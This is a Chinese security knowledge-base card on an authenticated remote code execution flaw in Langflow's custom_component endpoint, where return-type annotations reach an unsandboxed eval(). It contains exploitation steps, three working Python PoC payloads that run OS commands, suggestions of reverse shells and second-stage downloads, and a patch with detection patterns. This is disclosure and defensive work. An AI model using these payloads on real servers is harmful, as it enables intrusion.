---
id: ai-security-agent-security-langflow-code-parser-return-annotation-eval-rce
title: Langflow CodeParser 返回类型注解 eval 无沙箱：custom_component 端点已认证用户 RCE（1.8.3/1.8.4）
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: langflow-code-parser-return-annotation-eval-builtins
tags:
- ai-security
- langflow
- llm
- agent
- rce
- python
- eval
- builtins
- ast
- custom-component
- authenticated
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: Langflow 1.8.3、1.8.4（原文标注两者均可利用，未给出修复版本区间）
verification:
  verified_by: verifier-V132
  verified_at: '2026-11-06T05:49:31+08:00'
  notes: 已对照原文及8张图核对：CodeParser.parse_callable_details eval 未设 __builtins__、construct_eval_env exec 动态导入、三个 POC 回显 uid=0(root) 与修复代码一致；1.8.4 仅原文声明通杀，实测截图来自 1.8.3，未在 1.8.4 独立验证。
url: /docs/ai-security/agent-security/ai-security-agent-security-langflow-code-parser-return-annotation-eval-rce/
draft: false
kb_aliases:
- Langflow CodeParser RCE
- Langflow 返回类型注解 eval 注入
- parse_callable_details eval
- custom_component 代码执行
- construct_eval_env exec 注入
- eval 未设置 __builtins__
- Langflow 1.8.3 RCE
- Langflow 1.8.4 RCE
---

## 一句话结论

Langflow 1.8.3/1.8.4 的 `POST /api/v1/custom_component` 在解析用户提交的组件代码时，`CodeParser.parse_callable_details()` 把函数返回类型注解 `ast.unparse()` 成字符串后直接 `eval()`，而 `construct_eval_env()` 构造的 eval 环境从未设置 `__builtins__`，CPython 会自动注入完整 builtins；任何已认证用户（无需 admin）只要在函数返回注解里写入 `__import__("os").popen("id").read()`，即可在服务端执行命令，命令输出通过组件构建错误详情回显。

## 原理

- **入口代码完全可控**：`endpoints.py` 的 `custom_component` 端点把请求体 `code` 交给 `build_custom_component_template()`，后者创建 `CodeParser(code)` 并调用 `parse_code()`。`code` 就是攻击者提交的整段 Python 源码，先 `ast.parse()` 再 `ast.walk()` 遍历所有节点。
- **注解被还原成字符串**：`ast.walk()` 会访问所有 `FunctionDef`（包括类方法），每个函数走 `parse_callable_details()`。只要函数带返回注解，就执行 `return_type_str = ast.unparse(node.returns)`，把注解表达式还原为源码字符串。
- **sink 是无沙箱 eval**：随后 `eval(return_type_str, eval_env)` 执行该字符串。`eval_env` 由 `construct_eval_env()` 返回，原始实现初始化为 `eval_env: dict = {}`，没有任何 `__builtins__` 限制。
- **为什么 builtins 会自动可用**：CPython 规定，传给 `eval()`/`exec()` 的 globals 字典若不含 `__builtins__` 键，解释器会自动插入完整的 builtins 模块。因此 `__import__`、`open`、`exec`、`eval` 等全部可用，不存在“只允许类型注解”的边界。这是整条链成立的根本原因。
- **第二处动态导入**：`construct_eval_env()` 为支持返回注解中的模块类型，使用 `exec(f"import {module}")`、`exec(f"from {module} import {name}")`、`exec(f"import {module} as {alias}")` 把用户代码里声明的 import 拼进 f-string 后执行。只要返回注解里出现 `os`，`import os` 就会把 `os` 注入 eval 环境，使 `os.popen(...)` 在注解中可直接调用。该 f-string 拼接本身也缺少标识符校验，属于同一解析器里的第二处加固点。
- **错误回显成为外带通道**：POC1/POC3 的注解返回命令输出字符串，后续组件模板构建把该字符串当作前向引用（forward reference）解析失败，响应 `detail.error` 变成 `Forward reference must be an expression -- got 'uid=0(root) ...'`；POC2 用 `lambda` 主动抛异常，把输出包进 `Exception(...)` 的错误详情。因此无需回连通道即可读回命令结果。
- **执行时机**：eval 发生在 CodeParser 解析阶段，即组件代码被“校验/构建模板”时，不需要真正运行 Flow，也不需要在画布中执行组件。

## 触发条件

- 运行 Langflow 1.8.3 或 1.8.4（原文实测 1.8.3，并声明对 1.8.4 同样可用；未给出完整受影响区间）。
- 攻击者持有任意有效登录 token（任意普通用户即可，不要求 superuser/admin）。
- `/api/v1/custom_component` 端点可从攻击者网络访问。
- 目标允许自定义 Python 组件（Langflow 默认能力）；无需存在既有 Flow。

## 利用步骤

1. 登录或通过其它方式取得 `Authorization: Bearer <token>`。
2. 构造组件代码：定义继承 `Component` 的类，并给某个方法（如 `build`）加上恶意返回类型注解；注解中直接调用 `__import__("os").popen("cmd").read()`，或在文件顶部 `import os` 后写 `os.popen("cmd").read()`。
3. 向 `POST /api/v1/custom_component` 发送 `{"code": "<payload>"}`，携带 Bearer token。
4. 读取响应 JSON 的 `detail.error`：POC1/POC3 中命令输出出现在 `Forward reference must be an expression -- got '<命令输出>'`，POC2 中出现在 `Exception('<命令输出>')`。
5. 更换命令（读文件、环境变量、反弹 shell、下载二阶段）重复利用；执行身份为 Langflow 后端进程用户（原文截图显示 `uid=0(root)`）。

## PoC

POC1：注解中直接 `__import__`。

```python
TARGET = "http://target:7860"
TOKEN = "<valid-token>"

payload = '''
from langflow.custom import Component
from lfx.io import Output

class PoCComponent(Component):
    display_name = "Test"
    outputs = [Output(display_name="Out", name="out", method="build")]

    def build(self) -> __import__("os").popen("id").read():
        return "test"
'''

resp = requests.post(f"{TARGET}/api/v1/custom_component",
    json={"code": payload},
    headers={"Authorization": f"Bearer {TOKEN}"})
print(resp.json()["detail"]["error"])
```

POC2：lambda + throw，把输出强制带进异常详情。

```python
payload = '''
from langflow.custom import Component
from lfx.io import Output

class PoCComponent(Component):
    display_name = "Test"
    outputs = [Output(display_name="Out", name="out", method="build")]

    def build(self) -> (lambda: (_ for _ in ()).throw(Exception(__import__("os").popen("id").read())))():
        return "test"
'''
```

响应中出现 `Error creating class. Exception(uid=0(root) gid=0(root) groups=0(root))`。

POC3：正常 `import os` + 注解内 `os.popen`，验证 `construct_eval_env` 的动态导入路径。

```python
payload = '''
import os
from langflow.custom import Component
from lfx.io import Output

class PoCComponent(Component):
    display_name = "Test"
    outputs = [Output(display_name="Out", name="out", method="build")]

    def build(self) -> os.popen("id").read():
        return "test"
'''
```

响应 `detail.error` 为 `Forward reference must be an expression -- got 'uid=0(root) gid=0(root) groups=0(root)'\n'`（原文截图）。

## 变体与关联

- **输出外带变体**：除 POC1 的字符串前向引用报错、POC2 的 lambda 抛异常外，也可在注解里直接 `open('/tmp/x','w').write(...)` 落盘，或 `os.system` 发起反弹 shell；eval 环境具备完整 builtins，命令执行方式不受限。
- **注解位置变体**：`ast.walk()` 会遍历类方法；把恶意注解放到任意方法（不一定是 `build`）都能触发，只要该方法有返回注解。
- **第二处 exec 注入**：修复代码专门为 `construct_eval_env()` 的 f-string 导入增加 `_is_safe_identifier()` 白名单，说明作者认为模块名/别名存在拼接注入面；主利用仍以 eval 为准。
- **与同产品卡片的关系**：[[ai-security-agent-security-langflow-build-public-tmp-data-code-exec]]（CVE-2026-33017，未认证 `build_public_tmp` 的 `data` 直达 `exec`）和 [[ai-security-agent-security-langflow-auto-login-tweaks-pythonrepl-builtins-rce]]（CVE-2026-10561，auto_login + tweaks 覆盖 `python_code`）是不同入口、不同 sink 的独立链；本卡的新颖点是“返回类型注解 → eval”，触发点更早（解析/校验阶段）且只要求普通登录用户。
- **同模式关联**：与 [[ai-security-agent-security-letta-running-message-eval-rce]] 等“AI 平台把用户可控字符串送进 eval/exec 且未收紧 `__builtins__`”的案例同属一类。
- **边界**：需要有效 token；若目标关闭注册或自定义组件功能，需要先获得低权限账号。原文未给出 CVE 编号与修复版本。

## 检测与防御

- **修复代码**：采用官方/文章给出的 `code_parser.py` 补丁：`eval_env` 初始化为 `{"__builtins__": {}}`；`construct_eval_env()` 用 `importlib.import_module()` 替代 `exec(f"import ...")` 并校验模块名/别名；在 `parse_callable_details()` 的 `eval()` 前用 `_is_safe_return_type_ast()` 做 AST 白名单，禁止 `ast.Call`、`ast.Lambda`、`ast.BinOp` 之外的调用型节点。升级到包含该补丁的版本；文章声明 1.8.4 仍可打，不能以 1.8.4 为安全版本。
- **根本原则**：不要对用户可控字符串使用 `eval()` 做类型解析；若必须解析注解，使用 `ast.literal_eval` 或纯 AST 白名单遍历并只在白名单命名空间内解析，且显式设置 `__builtins__ = {}`。
- **权限收敛**：把 `/api/v1/custom_component` 及自定义组件代码提交限制为管理员/受信开发者；普通用户不应能提交任意 Python 源码。
- **执行隔离**：即使修复前，也应把 Langflow 后端放在低权限、只读根文件系统、无 Docker Socket、默认阻断出站的容器中运行，降低 RCE 后的影响。
- **检测**：WAF/日志匹配请求体中的 `-> __import__`、`-> os.popen`、`-> lambda`、`-> __builtins__`、`-> eval(` 等返回注解特征；监控 `detail.error` 中出现 `Forward reference must be an expression -- got 'uid=` 或 `Exception(uid=` 的响应；排查 Langflow 进程异常子进程、文件写入与外连。
